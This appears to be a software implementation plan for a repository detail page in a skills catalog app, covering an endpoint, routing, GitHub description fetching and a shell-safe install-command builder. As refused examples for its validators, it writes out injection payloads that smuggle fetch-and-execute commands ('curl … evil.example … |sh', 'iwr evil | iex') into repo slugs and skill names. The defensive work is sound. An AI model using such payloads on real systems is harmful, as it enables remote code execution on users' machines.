# Plan: Feature 1 — Repository detail page

| Field      | Value                                                         |
| ---------- | ------------------------------------------------------------- |
| Issue      | [#1](https://github.com/khomyakoleksandr/SkillStack/issues/1) |
| Status     | Ready                                                         |
| Revision   | 3                                                             |
| Built from | spec r2                                                       |
| Packages   | functions, shared, client, e2e                                |

## Approach

A new read-only endpoint `apiGetRepositoryDetails` (Handler → Domain → Store)
returns one repository with its skills and their install counts, already
sorted by the domain. `backendService` exposes it, and the client gets real
routing with the `react-router-dom` dependency it already declares: catalog
rows link to `/repositories/:id`, a new page that renders the header, the
loading, empty, error and not-found states, and one row per skill with a
"Copy install command" button. Descriptions are not stored anywhere, and the
backend must not call GitHub (ADR-005). So the page loads them afterwards,
best effort (BR-8), through a new `githubService.getSkillDescriptions` that
reads the `SKILL.md` frontmatter. A skill without a description, or a GitHub
failure, never blocks the list. The copied command comes from a shared pure
helper that builds `npx skillstack-cli add <GitHub URL> --skill <name>`
(FR-4), a form the CLI's `add` command already accepts. Stored names are
untrusted (ADR-005), so the helper builds a command only from a slug and a
name made of characters that stay literal unquoted in every common shell.
Otherwise it builds nothing and the page says so (D-7, A-6). The GitHub
gateway applies the same slug check before it builds API paths (D-11).
There are no CLI code changes and no data migration, but the copied command
only runs once a CLI release that contains `add` is on npm (PG-5).

## Current state

- `functions/src/services/repositories-store.ts`: `repositoriesStore.get(id)`
  returns a repository document merged with its id, or `null`.
  `listSkillNames(repoId)` returns only the ids of the `skills` subcollection.
  The type `SkillWithInstalls = { name; installCount }` is declared but unused.
  Nothing reads `installCount` back.
- Skill copies drift today:
  `storeRepoInfo` (`functions/src/functions/store-repo-info/function.ts`)
  writes only the `skills[]` array. For an existing repository,
  `repositoriesStore.recordInstalls` / `updateSkillInstalls` create or
  increment only the subcollection docs, and never touch the array. The e2e
  seeding (`e2e/support/firestore.ts` `seedRepositories` → `apiStoreRepoInfo`)
  produces array-only skills with no subcollection docs.
- `functions/src/index.ts` exports four handlers. The closest read pattern is
  `functions/src/functions/get-repositories-list/{index,function}.ts`
  (`publicHttpOptions`, `logError`, 500 on failure).
- `shared/firebase-cloude-api/index.ts`: `BackendService.request` supports GET
  and throws `BackendApiError` with `status` on non-2xx. `BackendApiError` is
  not exported from `shared/index.ts`.
- `shared/github-api/`: `request` (api.github.com, JSON, `GithubApiError` with
  `status`). `getSkillsList` already reads `git/trees/<branch>?recursive=1`
  and finds `*/skill.md` (case-insensitive, `toSkillName`).
  `get-repo-files.ts` `getBlob` decodes blobs with Node's `Buffer`, which the
  browser does not have. In dev mode (`import.meta.env.DEV`, which is also on
  in e2e), `shared/github-api/index.ts` swaps in `githubServiceMock`
  (`shared/github-api/mock/index.ts`).
- CLI contract (FR-4, BR-7): `cli/src/bin.ts` defines `add <repoUrl>` with
  `--skill <names...>`. `cli/src/commands/add/index.ts` passes `repoUrl` to
  `githubService.getRepoInfo` → `parseRepoPath`
  (`shared/utils/parse-repo-path.ts`), which accepts only
  `https://github.com/<owner>/<repo>[/tree/<ref>/<path>]`. `cli/package.json`
  names both the package and its binary `skillstack-cli`, so
  `npx skillstack-cli …` resolves to it. But npm holds only `0.0.1` and
  `0.0.2` (both published 2026-07-08), and the published `dist/bin.js`
  defines only `push` and `pull`. `add` arrived later, in commit `3ed3c68`
  (2026-07-24), and `cli/package.json` is still at `0.0.2`. The CLI bakes
  `BACKEND_URL` from `cli/.env` into its bundle at build time
  (`cli/tsup.config.ts`).
- Trust boundary (R-1): `apiStoreRepoInfo` and `apiTrackSkillsInstall` use
  `publicHttpOptions` (`invoker: 'public'`,
  `functions/src/utils/http-options.ts`). CORS limits browsers, not other
  HTTP clients. `repositorySchema` accepts any non-empty `repoSlug` and skill
  name, and `trackSkillsInstall` → `recordInstalls` → `updateSkillInstalls`
  creates a skill doc for any name on an existing repository. So stored
  slugs and names are attacker-controlled. The CLI itself stores GitHub's
  `full_name` (`shared/github-api/get-repo-info.ts`).
- r2 code that R-1 targets: `shared/utils/build-install-command.ts` puts
  `repoSlug` into the command raw and wraps unsafe names in POSIX single
  quotes (`'\''`), which PowerShell and cmd do not honor.
  `shared/github-api/get-skill-descriptions.ts` puts `repoSlug` raw into
  `repos/${repoSlug}/git/trees/…` and `…/git/blobs/…`. The only caller of
  `buildInstallCommand` is `SkillList.copyInstallCommand`
  (`client/src/components/RepositoryDetails/SkillList.tsx`).
- `tsconfig.base.json` does not set `strict`, so `strictNullChecks` is off:
  the compiler does not force callers to handle a `null` return.
- Client: `client/src/main.tsx` renders `App` with no router.
  `client/src/App.tsx` renders `Container` + `Heading` + `RepositoryList`.
  `client/src/components/RepositoryList/RepositoryList.tsx` renders non-clickable
  `ListItem`s (`data-testid` `repository-list`, `repository-item`,
  `repository-skill-count`, `repository-empty`) with `Skeleton`,
  `ErrorState` and `NoDataState` states. Data flows through
  `client/src/hooks/useRepositories.ts` → `client/src/lib/api.ts`
  `fetchRepositories` → `backendService`. `react-router-dom` 7.18.2 is in the
  root `package.json` and `package-lock.json` but is never imported.
- `firebase.json` hosting already rewrites `**` to `/index.html`, and
  `client/index.html` uses absolute asset paths, so deep links work once
  routes exist.
- ELEKS UI provides everything needed: `List`, `ListItem`, `ListItemText`,
  `ListItemButton` (`core/List/api`), `Chip`, `Button`, `Link`, `Snackbar`,
  `Alert`, `Skeleton`, `Stack`, `Heading`, `ErrorState`, `NoDataState` and
  `Page404State`.
- Tests: `functions/src/services/repositories-store.spec.ts` (hoisted
  Firestore mock), `functions/src/integration-specs/*.i.spec.ts`,
  `shared/utils/get-repo-slug.spec.ts`, `e2e/repository-list.e2e.ts`. There is
  no spec for `BackendService`, `client/src/lib/api.ts`, `RepositoryList` or
  `App`.

## Design decisions

- **D-1**: Add `GET apiGetRepositoryDetails?id=<repositoryId>` as a new
  three-layer capability that returns `{ repository, skills }`. Why: it is a
  read and mirrors `apiGetRepositoriesList`. Keeping `skills` as a separate
  top-level key avoids clashing with the existing `repository.skills: string[]`.
  Rejected: embedding per-skill counts in `apiGetRepositoriesList`, which would
  read every subcollection on every catalog load and change an endpoint
  installed CLIs call; a POST body like `apiDeleteRepoInfo`. ADR: 003, 005.
- **D-2**: The page address is `/repositories/:id`, using the Firestore
  document id. Why: it is the issue's example, the list already carries `id`,
  `repositoriesStore.get` exists, and auto-ids are URL-safe. Rejected:
  `/repositories/:owner/:repo`, which needs a `findByPath` query and two
  params for no requirement. ADR: none.
- **D-3**: The skill list is the union of `repository.skills[]` and the
  `skills` subcollection doc ids. `installCount` comes from the subcollection
  doc and is 0 when the doc or field is missing. The domain sorts by
  `installCount` descending, then by `name` with `localeCompare(other, 'en')`,
  and each name appears once. Why: the two copies drift today (see
  **Current state**), and BR-2 and BR-3 apply. Sorting is a business rule and
  belongs in the domain. Rejected: array only, which misses tracked skills;
  subcollection only, which misses never-installed skills such as the e2e
  seeds. ADR: 003, 007.
- **D-4** (BR-8): The browser fetches descriptions from GitHub through a new
  `githubService.getSkillDescriptions`, after the skills have rendered, as a
  best effort. Any failure means no descriptions. Why: descriptions are not
  persisted (spec non-goal), ADR-005 forbids `functions/` from calling GitHub,
  and "cross-service knowledge lives on the consumer side in `shared/`".
  Rejected: the backend reading GitHub, which breaks ADR-005; persisting
  `description` at install time, which is a spec non-goal and needs a CLI and
  data-model change. ADR: 004, 005.
- **D-5**: The `SKILL.md` lookup makes one `git/trees/<defaultBranch>?recursive=1`
  call. A skill matches the first blob `<dir>/SKILL.md` (file name
  case-insensitive, as in `toSkillName`) where `<dir>` equals the skill name
  or ends with `/<name>`. Blobs come from `git/blobs/<sha>` through the
  existing `request`, decoded from base64 with `atob` + `TextDecoder`, which
  works in the browser and in Node. Blob requests run in parallel with
  `Promise.allSettled`. Why: one transport and one error type, and stored
  skill names are bare names, not paths (Firestore doc ids cannot hold `/`).
  Rejected: `raw.githubusercontent.com`, a second transport; the Contents API
  on a guessed path, since names do not map to paths. ADR: 004.
- **D-6**: A small hand-written `parseSkillDescription` in `shared/utils`
  reads only `description` from the frontmatter: plain, quoted, folded and
  literal block scalars, with indented continuation lines. Why: only one
  field is needed. Rejected: making `yaml` or `js-yaml` a root dependency.
  Today they are only transitive, and a direct one would grow the client
  bundle and get pulled into the CLI bundle through `@shared`. ADR: 004.
- **D-7** (FR-4, BR-7; revised in r3 for R-1):
  `buildInstallCommand(repoSlug, skillName): string | null` in
  `shared/utils` returns
  `npx skillstack-cli add https://github.com/<repoSlug> --skill <skillName>`,
  with the prefix `npx skillstack-cli add` in one module constant, only when
  `isSafeRepoSlug(repoSlug)` and `isSafeSkillName(skillName)` both hold.
  Otherwise it returns `null`. It never quotes, escapes or rewrites its
  inputs. The allowlists are in **Changes by package**. Their characters
  (letters, digits, `.`, `_`, `-`, one `/` in the slug, plus the fixed
  `https://github.com/`) are literal when unquoted in bash, zsh, fish,
  PowerShell and cmd. A skill name must start with a letter or digit, so it
  can never be read as a CLI option (`-…`) or a dot path. The `<repo-url>`
  part is the full GitHub URL, because the CLI's `add <repoUrl>` →
  `parseRepoPath` accepts only that form. `npx` passes every argument after
  the package name on to the binary. Why an allowlist: the page cannot know
  the user's shell, no one quoting scheme works in POSIX shells, PowerShell
  and cmd together, and FR-4 hides the command, so the user cannot inspect
  it before pasting. Why shared: the command encodes the CLI's argument
  contract next to `parseRepoPath`. Rejected: r2's POSIX single quoting,
  which PowerShell breaks out of and cmd ignores (R-1); stripping or
  percent-encoding unsafe characters, which changes the exact name (BR-7),
  and `%` is itself special in cmd; an `owner/repo` shorthand, which the CLI
  rejects; `npx --yes …`, which is not the decided form; a client-local
  helper. Tightening `repositorySchema` in `functions/` is defense in depth
  for a separate issue (see **Risks**). It would not protect documents that
  are already stored. ADR: 004, 005.
- **D-8**: Routing uses `react-router-dom`: `BrowserRouter` in `main.tsx`, and
  `Routes` in `App.tsx` with `/` for the catalog, `/repositories/:id` for the
  page, and `*` → `<Navigate to="/" replace />`. Why: the dependency already
  exists, `App` stays router-agnostic for `MemoryRouter` tests, and the `*`
  redirect keeps today's "any path shows the catalog" behavior. Rejected: a
  hand-rolled history listener. ADR: 008 (router links go through the ELEKS
  wrappers).
- **D-9**: Status mapping. The backend returns 400 for an invalid id (missing,
  empty, not a string, or containing `/`), 404 for an unknown id, and 500 for
  anything else. `client/src/lib/api.ts` `fetchRepositoryDetails` returns
  `null` for a `BackendApiError` with status 400 or 404, which the page shows
  as not found, and rethrows everything else, which the page shows as an
  error. `BackendApiError` gets exported from `@shared`. ADR: 003, 004.
- **D-10**: UI rules. A skill without a description shows no secondary text,
  so no placeholder flips to real text while descriptions load (BR-1 and
  BR-8 allow "no description text"). The install chip reads `N installs`, or
  `1 install`, styled like the catalog's outlined primary `N skills` chip.
  One page-level `Snackbar` + `Alert` shows the copy feedback. Every state
  reuses the catalog's layout: `Skeleton` rows, and `ErrorState` /
  `NoDataState` / `Page404State` centered in
  `Stack alignItems="center" sx={{ py: 6 }}` (NFR-2). ADR: 008.
- **D-11** (BR-8; new in r3 for R-1): `getSkillDescriptions` checks
  `isSafeRepoSlug(repoSlug)` first and, when it fails, rejects with
  `new Error('Unsafe repository slug')` before any request. Why: the slug
  goes raw into `repos/${repoSlug}/git/…`, and one rule in `shared/utils`
  covers both the command and the API path. The client needs no change,
  because `fetchSkillDescriptions` already turns every rejection into `{}`
  (BR-8, TC-63). Rejected: `encodeURIComponent` per segment, which still
  sends junk slugs to GitHub; resolving `{}` silently, which looks the same
  as "no `SKILL.md`" in tests and logs; a check in `client/src/lib/api.ts`,
  because the gateway builds the path and owns the guard (ADR-004). ADR: 004.

## Assumptions

- ~~A-1~~ (removed: confirmed in spec r2 as BR-8 and AC-15)
- ~~A-2~~ (removed: confirmed in spec r2 as NFR-1 and AC-13)
- ~~A-3~~ (removed: confirmed in spec r2 in FR-4, BR-5 and AC-11)
- ~~A-4~~ (removed: spec r2 FR-4 fixes the prefix `npx skillstack-cli add`)
- **A-5**: publishing a `skillstack-cli` version that contains `add` is a
  manual release step for a maintainer (**Rollout** step 3), outside the
  tasks. The plan changes no CLI code and does not bump `cli/package.json`
  (PG-5).
- **A-6** (new in r3, R-1; raised as PG-6): every skill keeps its enabled
  "Copy install command" button (FR-4). When `buildInstallCommand` returns
  `null`, a click does not touch the clipboard. The page-level `Snackbar`
  shows an error `Alert` "Could not build a safe install command for this
  skill." without any command text, and it replaces earlier feedback like
  the other two messages. Why this default: it is a reversible UI choice,
  it reuses the BR-5 feedback, and it never shows or copies unsafe text.
  Rejected: disabling or hiding the button, which gives no reason and drops
  the one-button-per-skill layout.

## Changes by package

### functions

Store (`repositories-store.ts`):

```ts
export const skillDocumentSchema = z.object({
  installCount: z.number().int().min(0).default(0)
});
listSkills(repoId: string): Promise<SkillWithInstalls[]>; // name = doc id
```

Domain (`functions/src/functions/get-repository-details/function.ts`, **new**):

```ts
export type RepositoryDetails = {
  repository: RepositoryWithId;
  skills: SkillWithInstalls[]; // D-3 order, unique names
};
export async function getRepositoryDetails(
  input: unknown // { id }, Zod: z.string().min(1).regex(/^[^/]+$/)
): Promise<RepositoryDetails | null>; // null = not found; ZodError on bad id
```

Endpoint `apiGetRepositoryDetails` (`publicHttpOptions`, exported from
`functions/src/index.ts`):

| Request                                | Status | Body                                                           |
| -------------------------------------- | ------ | -------------------------------------------------------------- |
| `GET /apiGetRepositoryDetails?id=r1`   | 200    | `{ repository: { id, repoSlug, owner, defaultBranch, skills?, totalInstalls? }, skills: [{ name, installCount }] }` |
| `id` missing, empty, array, has `/`    | 400    | `{ error: 'Invalid repository id' }`                           |
| unknown `id`                           | 404    | `{ error: 'Repository not found' }`                            |
| store failure                          | 500    | `{ error: 'Failed to get repository details' }`                |

Example 200 response for `skills[] = ['alpha', 'beta', 'gamma']` with
subcollection docs `alpha: { installCount: 5 }`, `beta: { installCount: 12 }`
and `delta: { installCount: 5 }`:

```json
"skills": [
  { "name": "beta", "installCount": 12 },
  { "name": "alpha", "installCount": 5 },
  { "name": "delta", "installCount": 5 },
  { "name": "gamma", "installCount": 0 }
]
```

There are no new writes, no Firestore document changes, no indexes and no
migration.

### shared

- `backendService.getRepositoryDetails(id: string): Promise<GetRepositoryDetailsResponse>`
  sends GET `${BACKEND_URL}/apiGetRepositoryDetails?id=${encodeURIComponent(id)}`.
  A non-2xx response throws `BackendApiError` with `status`.
- New types in `shared/firebase-cloude-api/index.ts`:
  `RepositorySkill { name: string; installCount: number }` and
  `GetRepositoryDetailsResponse { repository: RepositoryWithId; skills: RepositorySkill[] }`.
- `githubService.getSkillDescriptions(options: { repoSlug: string; defaultBranch: string; skillNames: string[] }): Promise<Record<string, string>>`
  (D-5). A `repoSlug` that fails `isSafeRepoSlug` rejects with
  `Error('Unsafe repository slug')` and makes no requests (D-11, checked
  first). With an empty `skillNames` it returns `{}` and makes no requests. A
  failed tree request, including a 403 rate limit, rejects with
  `GithubApiError`. A skill whose blob fails, or whose file has no
  description, is omitted from the result.
- `githubServiceMock.getSkillDescriptions` returns
  `{ [name]: \`Description of ${name}\` }` for every requested name. This is
  the dev and e2e contract.
- `parseSkillDescription(markdown: string): string | undefined` (D-6) returns
  a trimmed string, or `undefined` when there is no frontmatter, no
  `description`, or an empty one.
- `shared/utils/safe-names.ts` (**new**, r3) exports two predicates. Both
  test the whole string (anchored, no flags) and never trim:
  - `isSafeRepoSlug(repoSlug: string): boolean`: exactly `<owner>/<repo>`,
    where owner matches `[A-Za-z0-9-]+` and repo matches `[A-Za-z0-9._-]+`
    and is not `.` or `..`. For example, it accepts `octocat/hello-world`,
    `octocat/.github` and `acme-labs/my_repo.v2`, and refuses
    `acme/tools;curl -s https://evil.example/x|sh;#`, `acme`, `acme/a/b`,
    `acme/..` and `ac.me/x`.
  - `isSafeSkillName(skillName: string): boolean`: matches
    `^[A-Za-z0-9][A-Za-z0-9._-]*$`. For example, it accepts `code-review`
    and `My_skill-2.v1`, and refuses `x'; iwr evil | iex; '`, `my skill; ls`,
    `it's`, `-rf`, `.hidden`, `a/b` and the empty string.
- `buildInstallCommand(repoSlug: string, skillName: string): string | null`
  (D-7). For example, `('octocat/hello-world', 'code-review')` returns
  `npx skillstack-cli add https://github.com/octocat/hello-world --skill code-review`,
  and `('acme/tools;curl -s https://evil.example/x|sh;#', 'lint')` and
  `('octocat/hello-world', "x'; iwr evil | iex; '")` return `null`.
- `shared/utils/index.ts` also exports `isSafeRepoSlug` and `isSafeSkillName`
  (r3). `shared/index.ts` adds the exports `BackendApiError`,
  `buildInstallCommand` and the types `RepositorySkill` and
  `GetRepositoryDetailsResponse`. Existing exports stay unchanged. r3 adds
  nothing to `shared/index.ts`.

### client

- Routes: `/` shows `Heading` "Repositories" + `RepositoryList`.
  `/repositories/:id` shows `RepositoryDetails`. `*` redirects to `/`.
- Catalog rows link to `/repositories/${encodeURIComponent(repository.id)}`
  and navigate client-side. The `repository-item` row and its text stay as
  they are.
- `client/src/lib/api.ts`:
  - `fetchRepositoryDetails(id): Promise<GetRepositoryDetailsResponse | null>`
    (D-9).
  - `fetchSkillDescriptions(repository: RepositoryWithId, skillNames: string[]): Promise<Record<string, string>>`
    never rejects (BR-8). It returns `{}` on any error, including a
    `GithubApiError` from a rate limit, or when `skillNames` is empty or
    `repository.defaultBranch` is missing.
- `useRepositoryDetails(id: string)` returns
  `{ status: 'loading' | 'ready' | 'not-found' | 'error'; repository: RepositoryWithId | null; skills: Array<RepositorySkill & { description?: string }> }`.
  Descriptions merge into `skills` once they arrive, and never change
  `status`.
- UI text and test ids (contract for the unit and e2e tests):

| Element            | Text / behavior                                                         | `data-testid`                |
| ------------------ | ----------------------------------------------------------------------- | ---------------------------- |
| Back control       | link "Back to repositories", `href="/"`, shown in every state           | `back-to-repositories`       |
| Header (ready)     | `Heading` title = `repoSlug`, subtitle = `owner`, `divider`             | (`Heading`'s own)            |
| Loading            | 4 `Skeleton` rows, like the catalog                                     | `repository-details-loading` |
| Not found          | `Page404State` description "This repository does not exist."            | `repository-not-found`       |
| Error              | `ErrorState` description "Could not load this repository. Please try again later." | `repository-details-error` |
| Empty              | `NoDataState` + "This repository has no skills yet."                    | `skill-empty`                |
| List / row         | `List` / `ListItem`, primary = name, secondary = description or nothing | `skill-list` / `skill-item`  |
| Install count      | outlined primary `Chip` "N installs" ("1 install")                      | `skill-install-count`        |
| Copy button        | `Button` "Copy install command"                                         | `skill-copy-button`          |
| Copy success       | `Alert` success "Install command copied"                                | `copy-feedback`              |
| Copy failure       | `Alert` error "Could not copy the install command. Run: <command>"      | `copy-feedback`              |
| Copy refused (r3)  | `Alert` error "Could not build a safe install command for this skill." The clipboard is untouched (A-6) | `copy-feedback` |
| Command text       | not rendered anywhere on the page except inside the copy-failure `Alert`, and never for a refused command (FR-4, BR-5, A-6) | — |

### e2e

- `e2e/support/firestore.ts`: `seedRepositories` returns `Promise<string[]>`
  (the ids from `apiStoreRepoInfo`). Existing callers ignore the return value.
  The new `trackInstalls(fixture: RepositoryFixture, skills: string[])` posts
  once to the real `apiTrackSkillsInstall`.

## Tasks

### T-1: Read skills with install counts in the store

- **Package:** functions
- **Depends on:** none
- **Covers:** FR-7, BR-2, AC-9
- **Files:** `functions/src/services/repositories-store.ts` (modify),
  `functions/src/services/repositories-store.spec.ts` (modify)
- **Steps:**
  1. Add `skillDocumentSchema` (shape in **Changes by package**) next to
     `repositorySchema`. Existing skill docs only hold `installCount`, so
     they parse.
  2. Add `listSkills(repoId)`. Follow `listSkillNames`: get
     `skillsCollection(repoId)` and map each doc to
     `{ name: doc.id, installCount: skillDocumentSchema.parse(doc.data()).installCount }`,
     typed with the existing `SkillWithInstalls`.
  3. Extend the spec with the hoisted mock (`skillsCollGet` docs gain
     `data()`).
- **Done when:** `cd functions; npx vitest run src/services/repositories-store.spec.ts`
  passes and `cd functions; npx tsc --noEmit` reports no errors.

### T-2: Add the `apiGetRepositoryDetails` endpoint

- **Package:** functions
- **Depends on:** T-1
- **Covers:** FR-2, FR-3, FR-7, BR-2, BR-3, BR-4, AC-2, AC-3, AC-9, AC-10
- **Files:** `functions/src/functions/get-repository-details/function.ts`
  (**new**), `functions/src/functions/get-repository-details/index.ts`
  (**new**), `functions/src/index.ts` (modify),
  `functions/src/functions/get-repository-details/function.spec.ts` (**new**),
  `functions/src/integration-specs/get-repository-details.i.spec.ts` (**new**)
- **Steps:**
  1. Domain `getRepositoryDetails(input)`: parse `{ id }` with the Zod schema
     from **Changes by package**, then run `repositoriesStore.get(id)` and
     `repositoriesStore.listSkills(id)` with `Promise.all`. Return `null` when
     the repository is missing. Otherwise merge and sort per D-3 and return
     `{ repository, skills }`. Nothing about HTTP goes here.
  2. Handler `apiGetRepositoryDetails`: copy
     `get-repositories-list/index.ts` and pass `request.query` to the domain.
     Map `null` → 404, `ZodError` (`instanceof`, from `zod`) → 400, and other
     errors → 500 with `logError`. Bodies follow the endpoint table.
  3. Export it in `functions/src/index.ts`, below `admin.initializeApp()`,
     after the existing exports.
  4. The unit spec mocks `firebase-admin/firestore` the way
     `repositories-store.spec.ts` does, and goes through the real store.
  5. The integration spec follows `track-skills-install.i.spec.ts`: seed with
     `db` (repository doc with `skills[]`, plus subcollection docs, as in the
     example in **Changes by package**), then
     `fetch(\`${BASE_URL}/apiGetRepositoryDetails?id=…\`)`.
- **Done when:** `cd functions; npx vitest run src/functions/get-repository-details/function.spec.ts src/services/repositories-store.spec.ts`
  passes, and `cd functions; npx tsc --noEmit` reports no errors. With
  `verification=full`, `cd functions; npm run test:integration:ci` also passes.

### T-3: Expose repository details through `backendService`

- **Package:** shared
- **Depends on:** T-2
- **Covers:** FR-7, BR-4, AC-10
- **Files:** `shared/firebase-cloude-api/index.ts` (modify), `shared/index.ts`
  (modify), `shared/firebase-cloude-api/index.spec.ts` (**new**)
- **Steps:**
  1. Add the types `RepositorySkill` and `GetRepositoryDetailsResponse`, and
     `getRepositoryDetails(id)`, following `getRepositoriesList` with the
     endpoint string `apiGetRepositoryDetails?id=${encodeURIComponent(id)}`.
  2. Export `BackendApiError` and both types from `shared/index.ts`.
  3. The spec constructs `new BackendService('http://backend.test')` and
     stubs global `fetch`.
- **Done when:** `npx vitest run shared/firebase-cloude-api/index.spec.ts`
  passes and `npm run typecheck` reports no errors.

### T-4: Add the install-command and description helpers

- **Package:** shared
- **Depends on:** none
- **Covers:** FR-2, FR-4, BR-1, BR-7, AC-4, AC-8
- **Files:** `shared/utils/safe-names.ts` (**new**, r3),
  `shared/utils/build-install-command.ts` (**new**),
  `shared/utils/parse-skill-description.ts` (**new**),
  `shared/utils/index.ts` (modify), `shared/index.ts` (modify),
  `shared/utils/safe-names.spec.ts` (**new**, r3),
  `shared/utils/build-install-command.spec.ts` (**new**),
  `shared/utils/parse-skill-description.spec.ts` (**new**)
- **Steps:**
  1. (r3, R-1) Add `isSafeRepoSlug` and `isSafeSkillName` in
     `shared/utils/safe-names.ts` with the rules and examples in **Changes
     by package**. They are pure and have no imports.
  2. (revised in r3, R-1) `buildInstallCommand` per D-7: return `null`
     unless both predicates hold, then build the command with the prefix
     `npx skillstack-cli add` in one module constant and the URL built as
     `https://github.com/${repoSlug}`. Delete `quoteForShell` and the local
     `SAFE_SKILL_NAME`, so the module has no quoting left.
  3. `parseSkillDescription` per D-6: strip a BOM, require a leading `---`
     line and a closing `---` line, find a top-level `description:` key, and
     handle plain, `'…'`/`"…"`, `>`/`>-`/`|`/`|-` and indented continuation
     lines (folded and plain values join with spaces, literal ones with `\n`).
     Trim the result, and return `undefined` when it is empty.
  4. Export both helpers and (r3) both predicates from
     `shared/utils/index.ts`, and `buildInstallCommand` from
     `shared/index.ts`.
  5. Specs follow `shared/utils/get-repo-slug.spec.ts`. The CLI-acceptance
     test feeds the command's URL to `parseRepoPath`. (r3) The two quoting
     tests become refusal tests, and `safe-names.spec.ts` checks the accept
     and refuse examples in a table (`it.each`).
- **Done when:** `npx vitest run shared/utils/safe-names.spec.ts shared/utils/build-install-command.spec.ts shared/utils/parse-skill-description.spec.ts`
  passes, `npm run typecheck` reports no errors, and
  `npx eslint shared/utils/safe-names.ts shared/utils/build-install-command.ts`
  is clean.

### T-5: Add `githubService.getSkillDescriptions`

- **Package:** shared
- **Depends on:** T-4
- **Covers:** FR-2, BR-1, BR-8, AC-2, AC-8, AC-15
- **Files:** `shared/github-api/get-skill-descriptions.ts` (**new**),
  `shared/github-api/index.ts` (modify), `shared/github-api/mock/index.ts`
  (modify), `shared/github-api/get-skill-descriptions.spec.ts` (**new**)
- **Steps:**
  1. Implement D-5, reusing `request` and the `GitTreeResponse` shape and
     manifest suffix logic from `get-skills-list.ts`. Use
     `repos/${repoSlug}/git/trees/${encodeURIComponent(defaultBranch)}?recursive=1`,
     then `repos/${repoSlug}/git/blobs/${sha}`, decode them (no `Buffer`), and
     run them through `parseSkillDescription`.
  2. Let a tree failure propagate as the `GithubApiError` from `request`
     (for example status 403 under a rate limit); the client catches it
     (T-7). Blob failures only drop their own skill.
  3. (r3, R-1) Before anything else, and before the empty `skillNames`
     shortcut, reject with `new Error('Unsafe repository slug')` when
     `isSafeRepoSlug(repoSlug)` (from `../utils`) fails, per D-11. No
     request is made. The dev `githubServiceMock` stays unchanged.
  4. Add the method to the `GithubService` interface and object, and add the
     mock method with the contract from **Changes by package**.
  5. The spec imports `./get-skill-descriptions` directly, which bypasses the
     dev mock swap in `index.ts`, and stubs global `fetch`.
- **Done when:** `npx vitest run shared/github-api/get-skill-descriptions.spec.ts`
  passes, `npm run typecheck` reports no errors, and `cd cli; npx tsc --noEmit`
  reports no new errors in the changed `shared/` files.

### T-6: Build the skill list with copy-to-clipboard

- **Package:** client
- **Depends on:** T-3, T-4
- **Covers:** FR-2, FR-4, BR-1, BR-2, BR-5, BR-7, NFR-2, AC-2, AC-4, AC-8, AC-9, AC-11, AC-14
- **Files:** `client/src/components/RepositoryDetails/SkillList.tsx` (**new**),
  `client/src/components/RepositoryDetails/SkillList.spec.tsx` (**new**)
- **Steps:**
  1. `SkillList({ repoSlug, skills })` renders `List` / `ListItem` rows like
     `RepositoryList`. The `secondaryAction` is a `Stack` row holding the
     install `Chip` and the copy `Button`. Text and test ids come from the UI
     table, and descriptions follow D-10.
  2. On click, build the command with `buildInstallCommand(repoSlug, name)`
     from `@shared`, then `await navigator.clipboard.writeText(command)`.
     A missing `navigator.clipboard` or a rejected write shows the failure
     `Alert` with the full command, and success shows the success `Alert`.
     Both render in one `Snackbar` with `autoHideDuration`. The command text
     is not rendered anywhere else (FR-4).
  3. (r3, R-1) When `buildInstallCommand` returns `null`, skip the
     clipboard and show the "Copy refused" `Alert` from the UI table in the
     same `Snackbar` (A-6), for example as a third `CopyFeedback` variant.
     Handle `null` explicitly: without `strictNullChecks` the compiler does
     not flag a missing branch, and an unchecked `null` would be written to
     the clipboard as the text `null`.
  4. Import only from `@eleks-ui/components` and `@mui/icons-material`, never
     from a relative eleks-ui path.
- **Done when:** `npx vitest run client/src/components/RepositoryDetails/SkillList.spec.tsx`
  passes, `npm run typecheck` reports no errors, and `npx eslint <changed files>`
  is clean. (r3) After the R-1 rework of T-4..T-6, `npm run test:run` also
  passes.

### T-7: Build the repository details page

- **Package:** client
- **Depends on:** T-3, T-5, T-6
- **Covers:** FR-2, FR-3, FR-5, FR-6, FR-7, BR-1, BR-4, BR-8, NFR-1, NFR-2, AC-2, AC-3, AC-5, AC-6, AC-7, AC-8, AC-10, AC-12, AC-13, AC-14, AC-15
- **Files:** `client/src/lib/api.ts` (modify),
  `client/src/lib/api.spec.ts` (**new**),
  `client/src/hooks/useRepositoryDetails.ts` (**new**),
  `client/src/components/RepositoryDetails/RepositoryDetails.tsx` (**new**),
  `client/src/components/RepositoryDetails/RepositoryDetails.spec.tsx` (**new**)
- **Steps:**
  1. Add `fetchRepositoryDetails` (D-9) and `fetchSkillDescriptions` to
     `lib/api.ts`, next to `fetchRepositories`. `fetchSkillDescriptions`
     catches every rejection and resolves to `{}` (BR-8).
  2. Write `useRepositoryDetails(id)` following `useRepositories`
     (`isActive` guard, an effect keyed on `id` that resets to `loading`).
     Phase 1 sets `ready`, `not-found` or `error`. Phase 2, only when `ready`,
     calls `fetchSkillDescriptions` and merges the descriptions. It never
     blocks or changes `status`, so names and counts show before
     descriptions arrive and stay when they fail (NFR-1, BR-8). Keep the
     backend's skill order.
  3. `RepositoryDetails` reads `id` with `useParams` and renders the back
     link (react-router `Link` passed as `component` to the ELEKS `Link`, or
     an equivalent link with `href="/"`), the header, the states and
     `SkillList`, per the UI table and D-10.
  4. `api.spec.ts` mocks `@shared` with a `vi.importActual` spread and stubs
     `backendService.getRepositoryDetails` and
     `githubService.getSkillDescriptions`.
- **Done when:** `npx vitest run client/src/lib/api.spec.ts client/src/components/RepositoryDetails/RepositoryDetails.spec.tsx`
  passes, `npm run typecheck` reports no errors, and `npx eslint <changed files>`
  is clean.

### T-8: Route the app and link catalog rows

- **Package:** client
- **Depends on:** T-7
- **Covers:** FR-1, BR-6, AC-1, AC-7
- **Files:** `client/src/main.tsx` (modify), `client/src/App.tsx` (modify),
  `client/src/components/RepositoryList/RepositoryList.tsx` (modify),
  `client/src/App.spec.tsx` (**new**),
  `client/src/components/RepositoryList/RepositoryList.spec.tsx` (**new**)
- **Steps:**
  1. Wrap `<App />` in `BrowserRouter` in `main.tsx`.
  2. `App`: keep the `Container`, and render `Routes` per D-8. The `/`
     element is today's `Heading` + `RepositoryList`.
  3. `RepositoryList`: wrap each row's content in `ListItemButton` from
     `@eleks-ui/components`, rendered as a react-router link to
     `/repositories/${encodeURIComponent(repository.id)}`. Keep the
     `ListItem` with `data-testid="repository-item"`, its `secondaryAction`
     chip and the `ListItemText`, so `e2e/repository-list.e2e.ts` keeps
     passing. If the wrapper's props reject `to`, use `href` + `useNavigate`
